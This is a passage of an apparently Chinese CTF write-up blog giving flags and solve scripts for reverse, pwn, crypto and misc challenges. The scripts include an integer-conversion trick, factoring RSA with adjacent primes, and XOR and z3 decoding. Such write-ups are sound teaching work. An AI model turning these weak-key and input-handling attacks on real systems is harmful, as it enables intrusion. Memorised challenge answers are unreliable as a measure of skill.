class="number">42</span>, <span class="number">60</span>,  <span class="number">30</span>,  <span class="number">20</span>, <span class="number">40</span>, <span class="number">36</span>, <span class="number">40</span>,  <span class="number">41</span>,<span class="number">97</span>,  <span class="number">50</span>, <span class="number">39</span>, <span class="number">63</span>, <span class="number">32</span>, <span class="number">12</span>,  <span class="number">9</span>, <span class="number">32</span>,<span class="number">104</span>,  <span class="number">55</span>, <span class="number">46</span>, <span class="number">4</span>, <span class="number">63</span>, <span class="number">53</span>,<span class="number">106</span>,<span class="number">17</span>,  <span class="number">7</span>, <span class="number">4</span>,  <span class="number">61</span>, <span class="number">14</span>,<span class="number">17</span>, <span class="number">38</span>, <span class="number">14</span>,  <span class="number">26</span>]</span><br><span class="line"></span><br><span class="line">key=<span class="number">67</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data)):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(data[i]^key),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    key=key+<span class="number">1</span></span><br><span class="line"><span class="comment">#flag&#123;buT_diff1cultY_w0nt_ch4Nge_muCh&#125;</span></span><br></pre></td></tr></table></figure><h3 id="三-睡-Lite">三.睡_Lite</h3><p>​上手给了个hex文件，嘶，有点难受，没逆过单片机，确实不知道该咋分析，开始一直以为是arm架构，但是拖进 ida 之后好像有地址错误，嘶，卡了很久，最后还下载了个单片机的烧录软件，寻思烧录出来看看，但是后面才知道好像只知道hex文件是烧录不了的，最后回到最开始的起点，拿hex文件问了一下gpt才知道，这居然是个avr架构。。。。。。</p><p><img src="https://img2023.cnblogs.com/blog/3445027/202406/3445027-20240606000436043-189306892.png" alt="image-20240427142003039"></p><p>​然后转bin直接拖进ida选择avr架构，反编译成功，爽了。。。</p><p><img src="https://img2023.cnblogs.com/blog/3445027/202406/3445027-20240606000435654-1585977903.png" alt="image-20240427142128842"></p><p>​题目说flag给的比较直接，然后看了最长的这个函数，有疑似flag的字符，应该就是直接提取</p><p><img src="https://img2023.cnblogs.com/blog/3445027/202406/3445027-20240606000436024-1034830217.png" alt="image-20240427142324051"></p><p>​flag开头的几个字符，将字符传个r24寄存器之后都有一个call sub_48的操作，盲猜应该就是类似输出的操作，所以只需要把所有有call sub_48这个操作的字符提取出来即可。<code>flag&#123;dEl4y_n0_MoR3&#125;</code></p><h2 id="Pwn">Pwn</h2><h2 id="一-摩登Pwn">一.摩登Pwn</h2><p>​运行显示，输入负数可以获取flag，看程序</p><p><img src="https://img2023.cnblogs.com/blog/3445027/202406/3445027-20240606000435610-628912075.png" alt="image-20240427145509851"></p><p>stroul把输入转换成无符号整数，输入<code>2147483648</code></p><p><img src="https://img2023.cnblogs.com/blog/3445027/202406/3445027-20240606000436195-232790634.png" alt="image-20240427145556628"></p><p><code>flag&#123;292be5d2-3a2f-4a03-ae34-c9a649c19d27&#125;</code></p><h2 id="Crypto">Crypto</h2><h3 id="一-Base64-rot13">一.Base64*rot13</h3><p><img src="https://img2023.cnblogs.com/blog/3445027/202406/3445027-20240606000435551-770209390.png" alt="image-20240427143319702"></p><p><code>flag&#123;ezez3zeze2ezEz&#125;</code></p><h3 id="二-模！">二.模！</h3><p>题目分析</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> factorial</span><br><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> reduce</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;flag&#123;xxxxxxxxxxxxxxxxxx&#125;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mooooo</span>(<span class="params">s: <span class="built_in">str</span></span>):</span><br><span class="line">    res = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> s: <span class="comment">#对flag中的字符进行匹配</span></span><br><span class="line">        res &lt;&lt;= <span class="number">8</span> <span class="comment">#位运算，相当于乘256</span></span><br><span class="line">        res += ( factorial(<span class="built_in">ord</span>(i)) % <span class="number">233</span> ) <span class="comment">#对字符进行阶乘，然后模233</span></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line">table = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz&#123;&#125;&quot;</span></span><br><span class="line"><span class="keyword">assert</span>(reduce(<span class="keyword">lambda</span> p,i:(i <span class="keyword">in</span> table)*p, flag, <span class="literal">True</span>)) <span class="comment">#匹配flag，flag中的字符只能是table里的</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(mooooo(flag))</span><br><span class="line"><span class="comment"># output: 2508450541438803643416583335895451914701844680466330955847</span></span><br></pre></td></tr></table></figure><p>既然每次是先左移8位/乘256，然后再求字符ASCII的阶乘并模233（巧的是，table里的字符的阶乘的模没有重复的）</p><p>那样我们可以倒着求，先除256，然后得到的余数就是字符ASCII的阶乘并模233的结果，然后结果逆置，匹配，即为结果</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> factorial</span><br><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> reduce</span><br><span class="line"></span><br><span class="line"><span class="comment"># table = &quot;abcdefghijklmnopqrstuvwxyz&#123;&#125;&quot;</span></span><br><span class="line"></span><br><span class="line">de_dict = &#123;</span><br><span class="line"><span class="number">114</span>:<span class="string">&#x27;a&#x27;</span>,</span><br><span class="line"><span class="number">221</span>:<span class="string">&#x27;b&#x27;</span>,</span><br><span class="line"><span class="number">210</span>:<span class="string">&#x27;c&#x27;</span>,</span><br><span class="line"><span class="number">30</span>:<span class="string">&#x27;d&#x27;</span>,</span><br><span class="line"><span class="number">1</span>:<span class="string">&#x27;e&#x27;</span>,</span><br><span class="line"><span class="number">102</span>:<span class="string">&#x27;f&#x27;</span>,</span><br><span class="line"><span class="number">21</span>:<span class="string">&#x27;g&#x27;</span>,</span><br><span class="line"><span class="number">87</span>:<span class="string">&#x27;h&#x27;</span>,</span><br><span class="line"><span class="number">48</span>:<span class="string">&#x27;i&#x27;</span>,</span><br><span class="line"><span class="number">195</span>:<span class="string">&#x27;j&#x27;</span>,</span><br><span class="line"><span class="number">128</span>:<span class="string">&#x27;k&#x27;</span>,</span><br><span class="line"><span class="number">77</span>:<span class="string">&#x27;l&#x27;</span>,</span><br><span class="line"><span class="number">5</span>:<span class="string">&#x27;m&#x27;</span>,</span><br><span class="line"><span class="number">84</span>:<span class="string">&#x27;n&#x27;</span>,</span><br><span class="line"><span class="number">4</span>:<span class="string">&#x27;o&#x27;</span>,</span><br><span class="line"><span class="number">215</span>:<span class="string">&#x27;p&#x27;</span>,</span><br><span class="line"><span class="number">63</span>:<span class="string">&#x27;q&#x27;</span>,</span><br><span class="line"><span class="number">192</span>:<span class="string">&#x27;r&#x27;</span>,</span><br><span class="line"><span class="number">178</span>:<span class="string">&#x27;s&#x27;</span>,</span><br><span class="line"><span class="number">144</span>:<span class="string">&#x27;t&#x27;</span>,</span><br><span class="line"><span class="number">72</span>:<span class="string">&#x27;u&#x27;</span>,</span><br><span class="line"><span class="number">108</span>:<span class="string">&#x27;v&#x27;</span>,</span><br><span class="line"><span class="number">37</span>:<span class="string">&#x27;w&#x27;</span>,</span><br><span class="line"><span class="number">13</span>:<span class="string">&#x27;x&#x27;</span>,</span><br><span class="line"><span class="number">175</span>:<span class="string">&#x27;y&#x27;</span>,</span><br><span class="line"><span class="number">147</span>:<span class="string">&#x27;z&#x27;</span>,</span><br><span class="line"><span class="number">140</span>:<span class="string">&#x27;&#123;&#x27;</span>,</span><br><span class="line"><span class="number">71</span>:<span class="string">&#x27;&#125;&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">en_flag = <span class="number">2508450541438803643416583335895451914701844680466330955847</span></span><br><span class="line">result_t = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">24</span>):</span><br><span class="line">    temp_x = en_flag % <span class="number">256</span></span><br><span class="line">    result_t.insert(<span class="number">0</span>, temp_x)</span><br><span class="line">    en_flag = en_flag - temp_x</span><br><span class="line">    en_flag = en_flag // <span class="number">256</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> result_t:</span><br><span class="line">    everyf = de_dict.get(x)</span><br><span class="line">    <span class="built_in">print</span>(everyf,end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><p><code>flag&#123;dalaodalaohaolihai&#125;</code></p><h3 id="三-NeXT-RSA">三.NeXT RSA</h3><p>原题分析</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sympy</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"></span><br><span class="line">flag=<span class="string">&quot;flag&#123;&quot;</span> + <span class="string">&quot;???&quot;</span> + <span class="string">&quot;&#125;&quot;</span></span><br><span class="line">m = libnum.s2n(flag)</span><br><span class="line"></span><br><span class="line">p = sympy.randprime(<span class="number">1</span>&lt;&lt;<span class="number">1024</span>, <span class="number">1</span>&lt;&lt;<span class="number">1025</span>) <span class="comment">#随机数，在1024位到1025位之间的数</span></span><br><span class="line">q = sympy.nextprime(p) <span class="comment">#p下一个素数</span></span><br><span class="line"></span><br><span class="line">n = p*q</span><br><span class="line">r = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line">c = <span class="built_in">pow</span>(m, e, n) <span class="comment">#正常RSA</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(n, e, c)</span><br><span class="line"><span class="comment"># output:</span></span><br><span class="line"><span class="comment"># 80044118049755180996754407858488943779355738585718372337839486032339412481191013051614126608584578841408197524632831442032118319629160505851518198448787590483634506563248531254421862061651099856312546562506221294620627871718678484548245902274972044599314097339549053518589561289734819710218838311181044519738709148493164321955860982700783886286661558574861608455547990794798848491695189544811325833194530596317989718866319530140199263278168146224240677087191093183415595617994125075880280632369616506148501757653260154487000183157405531772172082897743929126980157956142627803176227942226654177011633301413616266656761</span></span><br><span class="line"><span class="comment"># 65537</span></span><br><span class="line"><span class="comment"># 23280133104463252598665779150831148192014617461904564929071121215373331248942762386170411274023248423328388793808975632652896384007449549469345318875514363621903138122407682293848670093433946555776164835208375667498606187869211466397624286383057425296636315379314349307816391315242971306898487494604324473266965665471735612154916305882443496151118031672777088597821127499085632141307413890900246444539517971766135909771880642211582699957211983212981047822362311969553832913399476190919026666192056319334425636757404603336130688707109219644178606626422717046059209499394056295682594928581470210114322505904198054215544</span></span><br></pre></td></tr></table></figure><p>根据脚本看，p和q十分接近，那就可以开n的平方，求到在p、q之间的数字，然后向下/向上遍历，找到p和q，然后解RSA</p><p>结题脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">n = <span class="number">80044118049755180996754407858488943779355738585718372337839486032339412481191013051614126608584578841408197524632831442032118319629160505851518198448787590483634506563248531254421862061651099856312546562506221294620627871718678484548245902274972044599314097339549053518589561289734819710218838311181044519738709148493164321955860982700783886286661558574861608455547990794798848491695189544811325833194530596317989718866319530140199263278168146224240677087191093183415595617994125075880280632369616506148501757653260154487000183157405531772172082897743929126980157956142627803176227942226654177011633301413616266656761</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp1</span>(<span class="params">num</span>):</span><br><span class="line">    root = gmpy2.iroot(num, <span class="number">2</span>)[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(root, num):</span><br><span class="line">        <span class="keyword">if</span> num % i == <span class="number">0</span>:</span><br><span class="line">            p = i</span><br><span class="line">            q = num // i</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;p = <span class="subst">&#123;p&#125;</span>&#x27;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;q = <span class="subst">&#123;q&#125;</span>&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> p, q</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Decrypt</span>(<span class="params">c,e,p,q</span>):</span><br><span class="line">    phi=(p-<span class="number">1</span>)*(q-<span class="number">1</span>)<span class="comment">#算欧拉函数</span></span><br><span class="line">    d = inverse(e, phi)</span><br><span class="line">    m2 = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line">    m = long_to_bytes(m2)</span><br><span class="line">    <span class="built_in">print</span>(m)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="number">23280133104463252598665779150831148192014617461904564929071121215373331248942762386170411274023248423328388793808975632652896384007449549469345318875514363621903138122407682293848670093433946555776164835208375667498606187869211466397624286383057425296636315379314349307816391315242971306898487494604324473266965665471735612154916305882443496151118031672777088597821127499085632141307413890900246444539517971766135909771880642211582699957211983212981047822362311969553832913399476190919026666192056319334425636757404603336130688707109219644178606626422717046059209499394056295682594928581470210114322505904198054215544</span></span><br><span class="line"></span><br><span class="line">p, q = exp1(n)</span><br><span class="line"></span><br><span class="line">Decrypt(c, e, p, q)</span><br></pre></td></tr></table></figure><p><code>flag&#123;n0t_s3Cure_4t_aIl&#125;</code></p><h2 id="Misc">Misc</h2><h3 id="一-帕鲁服务器-1">一.帕鲁服务器#1</h3><p>打开虚拟机</p><p><img src="https://img2023.cnblogs.com/blog/3445027/202406/3445027-20240606000435677-1346181935.png" alt="image-20240427143727500"></p><p>抓包试试</p><p><img src="https://img2023.cnblogs.com/blog/3445027/202406/3445027-20240606000436068-1533430194.png" alt="image-20240427143745568"></p><p><code>flag&#123;Ur_s3rVer_1s_n0w_mY_p4l&#125;</code></p><h3 id="二-一眼盯帧">二.一眼盯帧</h3><p>​得到一个理塘王的视频，放的时候发现有异常图片闪过，既然盯帧了都，直接下载下来拆个帧，每一帧一拆，六千来张，直接按大小排个序，整合一下异常图片。</p><p><img src="https://img2023.cnblogs.com/blog/3445027/202406/3445027-20240606000436352-1519838895.png" alt="image-20240427144043407"></p><p>​得到62个表达式图片，思路清晰了，直接把表达式拿出来z3一把嗦了，一开始用uTools的OCR一个个识别，最后z3没嗦出来，心态炸了，最后又重新弄了一遍，找了个在线网站https://web.baimiaoapp.com/，一次最多识别放50张，分两次把62张放进去，还挺好用的</p><p><img src="https://img2023.cnblogs.com/blog/3445027/202406/3445027-20240606000435988-569616161.png" alt="image-20240427144209907"></p><p>​贴出解密脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">a1 = Int(<span class="string">&#x27;a1&#x27;</span>)</span><br><span class="line">a2 = Int(<span class="string">&#x27;a2&#x27;</span>)</span><br><span class="line">a3 = Int(<span class="string">&#x27;a3&#x27;</span>)</span><br><span class="line">a4 = Int(<span class="string">&#x27;a4&#x27;</span>)</span><br><span class="line">a5 = Int(<span class="string">&#x27;a5&#x27;</span>)</span><br><span class="line">a6 = Int(<span class="string">&#x27;a6&#x27;</span>)</span><br><span class="line">a7 = Int(<span class="string">&#x27;a7&#x27;</span>)</span><br><span class="line">a8 = Int(<span class="string">&#x27;a8&#x27;</span>)</span><br><span class="line">a9 = Int(<span class="string">&#x27;a9&#x27;</span>)</span><br><span class="line">a10 = Int(<span class="string">&#x27;a10&#x27;</span>)</span><br><span class="line">a11 = Int(<span class="string">&#x27;a11&#x27;</span>)</span><br><span class="line">a12 = Int(<span class="string">&#x27;a12&#x27;</span>)</span><br><span class="line">a13 = Int(<span class="string">&#x27;a13&#x27;</span>)</span><br><span class="line">a14 = Int(<span class="string">&#x27;a14&#x27;</span>)</span><br><span class="line">a15 = Int(<span class="string">&#x27;a15&#x27;</span>)</span><br><span class="line">a16 = Int(<span class="string">&#x27;a16&#x27;</span>)</span><br><span class="line">a17 = Int(<span class="string">&#x27;a17&#x27;</span>)</span><br><span class="line">a18 = Int(<span class="string">&#x27;a18&#x27;</span>)</span><br><span class="line">a19 = Int(<span class="string">&#x27;a19&#x27;</span>)</span><br><span class="line">a20 = Int(<span class="string">&#x27;a20&#x27;</span>)</span><br><span class="line">a21 = Int(<span class="string">&#x27;a21&#x27;</span>)</span><br><span class="line">a22 = Int(<span class="string">&#x27;a22&#x27;</span>)</span><br><span class="line">a23 = Int(<span class="string">&#x27;a23&#x27;</span>)</span><br><span class="line">a24 = Int(<span class="string">&#x27;a24&#x27;</span>)</span><br><span class="line">a25 = Int(<span class="string">&#x27;a25&#x27;</span>)</span><br><span class="line">a26 = Int(<span class="string">&#x27;a26&#x27;</span>)</span><br><span class="line">a27 = Int(<span class="string">&#x27;a27&#x27;</span>)</span><br><span class="line">a28 = Int(<span class="string">&#x27;a28&#x27;</span>)</span><br><span class="line">a29 = Int(<span class="string">&#x27;a29&#x27;</span>)</span><br><span class="line">a30 = Int(<span class="string">&#x27;a30&#x27;</span>)</span><br><span class="line">a31 = Int(<span class="string">&#x27;a31&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">slover = Solver()</span><br><span class="line"></span><br><span class="line">slover.add(<span class="number">40</span>*a1 +<span class="number">42</span>*a2 +<span class="number">69</span>*a3 +<span class="number">91</span>*a4 + <span class="number">91</span>*a5 + <span class="number">74</span>*a6 + <span class="number">45</span>*a7 +<span class="number">49</span>*a8 +</span><br><span class="line"><span class="number">99</span>*a9 +<span class="number">41</span>*a10 + <span class="number">79</span>*a11 + <span class="number">26</span>*a12 +<span class="number">51</span>*a13+ <span class="number">74</span>*a14+<span class="number">84</span>*a15 